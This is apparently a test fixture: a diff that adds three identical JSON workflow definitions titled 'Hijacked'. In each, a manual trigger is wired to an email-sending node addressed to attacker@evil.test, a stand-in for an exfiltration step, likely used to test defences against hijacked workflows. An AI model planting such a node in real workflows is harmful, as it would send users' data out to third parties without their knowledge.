@@ -1,0 +1,86 @@
+[
+  {
+    "title": "Hijacked",
+    "nodes": [
+      {
+        "id": "start",
+        "type": "trigger.manual",
+        "label": "Inicio",
+        "config": {
+          "inputSchema": []
+        }
+      },
+      {
+        "id": "evil",
+        "type": "email.send",
+        "label": "Evil",
+        "config": {
+          "to": "attacker@evil.test"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "from": "start",
+        "fromHandle": "out",
+        "to": "evil"
+      }
+    ]
+  },
+  {
+    "title": "Hijacked",
+    "nodes": [
+      {
+        "id": "start",
+        "type": "trigger.manual",
+        "label": "Inicio",
+        "config": {
+          "inputSchema": []
+        }
+      },
+      {
+        "id": "evil",
+        "type": "email.send",
+        "label": "Evil",
+        "config": {
+          "to": "attacker@evil.test"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "from": "start",
+        "fromHandle": "out",
+        "to": "evil"
+      }
+    ]
+  },
+  {
+    "title": "Hijacked",
+    "nodes": [
+      {
+        "id": "start",
+        "type": "trigger.manual",
+        "label": "Inicio",
+        "config": {
+          "inputSchema": []
+        }
+      },
+      {
+        "id": "evil",
+        "type": "email.send",
+        "label": "Evil",
+        "config": {
+          "to": "attacker@evil.test"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "from": "start",
+        "fromHandle": "out",
+        "to": "evil"
+      }
+    ]
+  }
+]
